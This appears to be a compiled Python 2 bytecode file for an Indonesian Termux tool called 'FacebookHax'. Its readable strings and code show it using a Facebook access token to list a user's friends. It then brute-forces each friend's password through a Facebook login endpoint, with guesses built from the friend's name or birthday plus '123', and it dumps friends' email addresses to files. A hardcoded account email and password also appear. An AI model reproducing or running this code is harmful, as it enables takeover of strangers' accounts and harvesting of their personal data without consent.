ó
ªz^c           @   sÚ  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z d  d l Z d  d l m Z d  d l m Z yD d  d l Z d  d l  Z  d  d l Z d  d l Z d  d l m Z Wn8 e k
 rJe  j d  e  j d  e  j d  n Xd  d	 l m Z d  d	 l m Z d  d l	 Z	 d  d
 l m Z d  d l m Z d   Z d   Z d Z  d   Z! d Z" g  Z# g  Z$ g  a% g  a& g  Z' g  Z( g  Z) g  Z* g  Z+ g  Z, g  Z- g  Z. g  Z/ g  Z0 g  Z1 g  Z2 g  Z3 g  Z4 g  Z5 g  Z6 d Z7 d Z8 d   Z9 d   Z: d   Z; d   Z< d   Z= d   Z> d   Z? d   Z@ d   ZA d   ZB d   ZC d   ZD d   ZE d    ZF eG d! k rÖe9   n  d S("   iÿÿÿÿN(   t
   ThreadPool(   t   MIMEMultipart(   t   MIMEText(   t   BeautifulSoups   pip2 install bs4s   pip2 install requestss   pip2 install mechanize(   t   sleep(   t   ConnectionError(   t   Browserc           C   s   d GHt  j d  S(   Ns   [!] Keluar!(   t   syst   exit(    (    (    s   face.pyR      s    c         C   s@   x9 |  d D]- } t  j j |  t  j j   t d  q Wd  S(   Ns   
g¹?(   R   t   stdoutt   writet   flushR   (   t   zt   e(    (    s   face.pyt   jalan   s    s:  [1;37m
_____________
< FacebookHax >
 -------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/||----w |
                ||     ||

           [Admin @khazuly.s]
             version 1.1

fitur update :
1. anti CP
2. Tanpa login FB
3. Fix error hack fb asyik
===========================
c          C   sC   d d d g }  x- |  D]% } d | Gt  j j   t d  q Wd  S(   Ns   .   s   ..  s   ... s   [+] Sedang masuk i   (   R   R	   R   R   (   t   titikt   o(    (    s   face.pyt   tik3   s
      i    s   [31mNot Vulns	   [32mVulnc          C   s   t  j d  t GHd GHd GHd GHt d  }  |  sB d GHt   nK |  d k sZ |  d k rd t   n) |  d	 k s| |  d
 k r t   n t   d  S(   Nt   clears
   [01] Masuks   [02] Chat Admins   [Ex] Keluars   
=>Pilih : s   [!] Pilihan tidak tersedia!t   1t   01t   2t   02(   t   ost   systemt   logot	   raw_inputR   t   logint
   chat_admin(   t   msk(    (    s   face.pyt   masukP   s    


c    	      C   sÔ   d }  d } d GHt    d } i |  d 6| d 6} t j    } | j |  | j | d | } | j d  } t | j d	  } | j d
  } t |  d k r´ d GHt	   n d GHt
 d  t   Wd  QXd  S(   Ns   kazanah500@gmail.comt   kazanaht    s   https://m.facebook.com/logint   emailt   passt   datas   https://m.facebook.com/home.phps   html.parsert   titles(   <title>Masuk Facebook | Facebook</title>s   [+] Masuk gagal!s   
[+] Masuk berhasil!i   (   R   t   requestst   Sessiont   gett   postR   t   contentt   findt   strR   R   t   menu(	   t   Emailt   Passwordt   URLt	   form_datat   ct   rt   bt   soupt   a(    (    s   face.pyR   a   s(    


c          C   s/  t  j d  yt t GHt d  }  t d d  } | j |   | j   t j d |   } t	 j
 | j  } | d } | d } Wnc t k
 rÄ t  j d  d GHt  j d	  t d
  t   n# t j j k
 ræ d GHt   n Xt  j d  t GHd | GHd | GHd GHd GHd GHd GHd GHt   d  S(   NR   s   [!] Token : s	   masuk.txtt   ws+   https://graph.facebook.com/me?access_token=t   namet   ids%   [!] Token expired! Chat admin segera!s   rm -rf masuk.txti   s   [!] Tidak ada koneksi!s   [+] Username : s   [+] Id       : R    s   [1] Meretas akun facebooks   [2] Tampilkan Email temans   [3] Keluar program(   R   R   R   R   t   openR
   t   closeR%   R'   t   jsont   loadst   textt   KeyErrorR   R   t
   exceptionsR   R   t   pilih(   t   tokett   khazt   otwR5   t   namaR8   (    (    s   face.pyR,   z   s<    



		c          C   sy   t  d  }  |  d k r' d GHt   nN |  d k r= t   n8 |  d k rS t   n" |  d k ri t   n d GHt   d  S(   Ns
   =>Pilih : R    s   [!] Masukkan salah!R   R   t   3(   R   R@   t	   menu_hackt	   dump_mailR   (   RB   (    (    s   face.pyR@      s    



c          C   s   t  j d  t GHt d  }  |  s3 d GHt   n
 d GHd GHt d  } | d k re t  j d  n | d	 k r{ t   n t   d  S(
   NR   s   Siapa nama kamu? s   masukkan nama!s   
[Adm] Admin : @khazuly.ss   [No] Whatsapp: +601136956558
s   Mau chat admin? (y/n)t   ys?   termux-open-url https://wa.me/601136956558?text=Halo%2C%20admint   n(   R   R   R   R   R   (   R7   t   tlp(    (    s   face.pyR   ª   s    

c          C   s   t  j d  y t d d  j   }  Wn4 t k
 r\ d GHt  j d  t d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHt   d  S(   NR   s	   masuk.txtR2   s   [!] Toket tidak ditemukan!s   rm -rf masuk.txtg{®Gáz?s   [1] Hack facebook asyiks   [2] Facebook Clone s
   [3] KeluarR    (	   R   R   R9   t   readt   IOErrorR   R,   R   t
   hack_pilih(   RA   (    (    s   face.pyRF   ¼   s    
c          C   sy   t  d  }  |  d k r' d GHt   nN |  d k r= t   n8 |  d k rS t   n" |  d k ri t   n d GHt   d  S(   Ns
   =>Pilih : R    s   [!] Masukkan salah!R   RE   R   (   R   RM   t   miniR   t   fb_clone(   t   hack(    (    s   face.pyRM   Í   s    



c           C   s   t  j d  y t d d  j   a Wn/ t k
 rW t  j d  t d  t   n Xt  j d  t GHd GHd GHd GHd	 GHd
 GHt	   d  S(   NR   s	   masuk.txtR2   s   rm -rf masuk.txtg        s   [1] Retas dari temans   [2] Retas teman di grups   [3] Kembalis
   [4] KeluarR    (
   R   R   R9   RK   RA   RL   R   R,   R   t
   pilih_hack(    (    (    s   face.pyRO   Ü   s    
c          C   s&  t  d  }  |  d k r' d GHt   nO|  d k rt j d  t GHt  d  } y> t j d | d t  } t j	 | j
  } d	 | d
 GHWn t k
 r® d GHt   n Xt d  t j d | d t  } t j	 | j
  } x | d D] } t j | d  qñ Wng |  d k r*d GHt   nL |  d k r@t   n6 |  d k rjt  d  t   t j   n d GHt   d t t t   GHt d  d d d g } x- | D]% } d | Gt j j   t d  q«WHd GHd   }	 t d  }
 |
 j |	 t  d GHt  d  t j d   t   d  S(!   Ns
   =>Pilih : R    s   [!] Masukkan salah!R   R   s   [+] Id teman : s   https://graph.facebook.com/s   ?access_token=s   [+] Nama teman : R7   s   [!] Id Salah!s   [+] Mendapatkan id teman ...s   /friends?access_token=R#   R8   R   s   [!] Fitur belum tersedia!RE   t   4s   
[tekan enter untuk keluar]s   [!] Total Id : s   [!] Mulai mengeksploit ...s   .   s   ..  s   ... s   [!] Mencoba meretas i   c         S   s  |  } yt  j d | d t  } t j | j  } | d d } t j d | d | d  } t j |  } d | k r± d	 | GHd
 | GHd | d GHt	 j
 | |  nÔd | d k rô d	 | GHd
 | GHd | d GHt j
 | |  n| d d } t j d | d | d  } t j |  } d | k rod	 | GHd
 | GHd | d GHt	 j
 | |  nd | d k r²d	 | GHd
 | GHd | d GHt j
 | |  nÓ| d d }	 t j d | d |	 d  } t j |  } d | k r^t  j d | d | d  }
 t j |
 j  } d	 | GHd
 |	 GHd | d GHt	 j
 | |	  n'd | d k r¡d	 | GHd
 |	 GHd | d GHt j
 | |	  nä| d } | j d d  } t j d | d | d  } t j |  } d | k r[t  j d | d | d  }
 t j |
 j  } d	 | GHd
 | GHd | d GHt	 j
 | |  n*d | d k rd	 | GHd
 | GHd | d GHt j
 | |  nç d } t j d | d | d  } t j |  } d | k rBt  j d | d | d  }
 t j |
 j  } d	 | GHd
 | GHd | d GHt	 j
 | |  nC d | d k rd | GHd
 | GHd | d GHt j
 | |  n  Wn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6t   access_tokens   
[ok] Username : s   [+] Password  : s   [+] Nama : R7   s   www.facebook.comt	   error_msgt   12345t	   last_names   ?access_token=s   [+] Name : t   birthdayt   /R    t	   sayang123t   sayangku123t   sayangs   
[ok] Username :  (   R[   R\   R]   (   R%   R'   RA   R;   R<   R=   t   urllibt   urlopent   loadt   okst   appendt   cekpointt   replace(   t   argt   userR5   R3   t   pass1R#   t   qR   t   pass2t   pass3t   xt   lahirt   pass4t   pass5(    (    s   face.pyt   main  s    												
								i   s   
[!] selesai!s   
[tekan enter untuk kembali]s6   termux-open-url https://instagram.com/termux.officials(   R   RQ   R   R   R   R%   R'   RA   R;   R<   R=   R>   RO   R   R8   Rb   R   RF   R   R+   t   lenR	   R   R   R    t   map(   t   zult   idtt   jokt   opR2   R   t   iR   R   Ro   t   p(    (    s   face.pyRQ   î   s^    





  	_
c    
      C   s[  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHyt	 d  } t
 d	  t j d
 | d |   } t j | j  } d | d GHt
 d  t j d  t
 d  t j d  d GHt d  | d d } t j d | d | d  } t j |  } d | k rd GHd | d GHd | GHd | GHt	 d  t   nód | d k rÏd GHd | d GHd  | GHd! | GHt	 d  t   n«| d" d } t j d | d | d  } t j |  } d | k rOd GHd | d GHd  | GHd | GHt	 d#  t   n+d | d k rd GHd | d GHd  | GHd! | GHt	 d$  t   nã | d% d } t j d | d | d  } t j |  } d | k rd GHd | d GHd  | GHd! | GHt	 d$  t   nc d | d k r_d GHd | d GHd  | GHd! | GHt	 d#  t   n d& GHd' GHt	 d$  t   WnÙ t k
 rV| d d }	 t j d | d | d  } t j |  } d | k rúd( GHd | d GHd  | GHd! |	 GHqWd | d k rBd( GHd | d GHd  | GHd! |	 GHt	 d$  t   qWd) GHd* GHt   n Xd  S(+   NR   s	   masuk.txtR2   s   [1;91m[!] Token not founds   rm -rf masuk.txtg{®Gáz?s#   [info] Jangan gunakan sembarangan!
s   [+] Id target: s   [+] Scanning id target ...s   https://graph.facebook.com/s   ?access_token=s   [+] username: R7   s   [+] Mulai meretas ...i   s   [+] Membuka password ...s   	
[Tunggu sedang diretas]i   RS   RT   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RU   s   [!] Ditemukan!s   [!] Nama : s   [!] Username : s   [!] Password: s   
[tekan enter keluar]s   www.facebook.comRV   s   [!] User ID : s   [!] Password : t   second_names   
[tekan enter untuk keluars   
[tekan enter untuk keluar]RX   s#   
[?] Maaf, gagal meretas akun tagets   [?] Silahkan coba lain waktu!s   
[!] Ditemukan!s   
[!] Password tidak ditemukan!s   [!] Silahkan coba ulang!(   R   R   R9   RK   RL   t   timeR   R,   R   R   R   R%   R'   R;   R<   R=   R^   R_   R`   R   R>   (
   RA   R8   R2   R5   t   pz1R#   RH   t   pz2t   pz3t   pz4(    (    s   face.pyRN   ~  sÂ    



		

		

		

		

		

		


			

c          C   s   t  j d  y t d d  j   }  Wn2 t k
 rZ t  j d  t j d  t   n Xt  j d  t GHd GHd GHd GHHt	   d  S(	   NR   s	   masuk.txtR2   s   rm -rf masuk.txtg{®Gáz?s   [1] Tampilkan email temans"   [2] Tampilkan email teman ke temans   [3] Kembali(
   R   R   R9   RK   RL   Ry   R   R   R   t
   dump_pilih(   RA   (    (    s   face.pyRG   ì  s    c          C   si   t  d  }  |  s t   nI |  d k r2 t   n3 |  d k rH t   n |  d k r^ t   n t   d  S(   Ns
   =>Pilih : R   R   RE   (   R   R   R!   t   email_temanR,   (   R@   (    (    s   face.pyR~   ü  s    



c          C   s  y t  d d  j   }  Wn/ t k
 rJ t j d  t d  t   n Xy t j d  Wn t k
 ro n Xyt j d  t	 GHt
 j d |   } t j | j  } t d  d	 GHt  d
 d  } xË | d D]¿ } t
 j d | d d |   } t j | j  } yt t j | d  | j | d d  d t t t   d	 | d d | d d Gt j j   t j d  WqÓ t k
 rqÓ XqÓ W| j   d	 GHd GHd t t  GHt d  } t j d
 d |  d | GHt d  t   Wn t k
 rd GHt d  t   nu t t f k
 rId GHt d  t   nI t k
 rod GHt d  t   n# t
 j  j! k
 rd GHt   n Xd  S(    Ns	   masuk.txtR2   s   rm -rf masuk.txtg{®Gáz?t   hasilR   s3   https://graph.facebook.com/me/friends?access_token=s   [+] Mengambil email teman ...R    s   hasil/emailteman.txtR6   R#   s   https://graph.facebook.com/R8   s   ?access_token=R!   s   
s   
[+]Email : s   
[+]Nama : R7   g-Cëâ6?s    [!] Berhasil mendapatkan email!s   [!] Total email : %ss   [?] Nama file?:  s   hasil/s   [!] file disimpan : hasil/s   
[tekan enter untuk keluar]s   [!] Gagal membuat file!s   [!] Berhenti!s
   [!] Rusak!s   [!] Tidak ada koneksi!("   R9   RK   RL   R   R   R   R   t   mkdirt   OSErrorR   R%   R'   R;   R<   R=   R   t   emRb   R
   R+   Rp   R   R	   R   Ry   R>   R:   R   t   renameR   t   KeyboardInterruptt   EOFErrorR?   R   (   RA   R2   R5   t   bzRv   Rk   R   t   done(    (    s   face.pyR!   	  sj    

0  
	






c          C   s  t  j d  y t d d  j   }  Wn/ t k
 rW t  j d  t d  t   n Xy t  j d  Wn t k
 r| n Xy t  j d  t	 GHt
 d  } y> t j d | d	 |   } t j | j  } d
 | d GHWn' t k
 rd GHt
 d  t   n Xt j d | d |   } t j | j  } t d  d GHt d d  } xË | d D]¿ } t j d | d d	 |   } t j | j  }	 yt t j |	 d  | j |	 d d  d t t t   d |	 d d |	 d d Gt j j   t j d  Wq\t k
 rq\Xq\W| j   d GHd GHd t t  GHt
 d  }
 t  j d d |
  d |
 GHt
 d  t   Wn t k
 r¦d GHt
 d  t   nu t t f k
 rÒd  GHt
 d  t   nI t k
 rød! GHt
 d  t    n# t j! j" k
 rd" GHt   n Xd  S(#   NR   s	   masuk.txtR2   s   rm -rf masuk.txtg{®Gáz?R   s   [+] Id teman : s   https://graph.facebook.com/s   ?access_token=s   [+] Email dari :  R7   s   [!] Kamu belum berteman!s   
[tekan enter untuk keluar]s   /friends?access_token=s   [+] Dapatkan email teman ...R    s   hasil/em_teman.txtR6   R#   R8   R!   s   
s   
[+]Email : s   
[+]Nama :  g-Cëâ6?s    [!] Berhasil mendapatkan email!s   [!] Total email: %ss   [?] Nama file? s   hasil/s   [!] File disimpan : out/s   [!] Gagal membuat files   [+] Berhenti!s
   [!] Rusak!s   [!] Tidak ada koneksi!(#   R   R   R9   RK   RL   R   R,   R   R   R   R   R%   R'   R;   R<   R=   R>   R   R   t   emfromtemanRb   R
   R+   Rp   R   R	   R   Ry   R:   R   R   R   t   dumpR?   R   (   RA   Rs   Rt   Ru   R2   R5   R   Rv   Rk   R   R   (    (    s   face.pyR   >  s~    


0  
	






t   __main__(H   R   R   Ry   t   datetimet   randomt   hashlibt   ret	   threadingR;   t   getpassR^   t	   cookielibt   multiprocessing.poolR    t   smtplibt   email.mime.multipartR   t   email.mime.textR   R%   t	   mechanizet   bs4R   t   ImportErrorR   R   t   timeoutt   requests.exceptionsR   R   R   R   R   R   t   backt   threadst   berhasilRc   Ra   t   gagalt   idtemant   idfromtemant   idmemt   emmemt   nomemR8   R   R   t   hpt   hpfromtemant   reaksit
   reaksigrupt   koment	   komengrupt   listgrupt   vulnott   vulnR   R   R,   R@   R   RF   RM   RO   RQ   RN   RG   R~   R!   R   t   __name__(    (    (    s   face.pyt   <module>   sv   0						!							n			5	?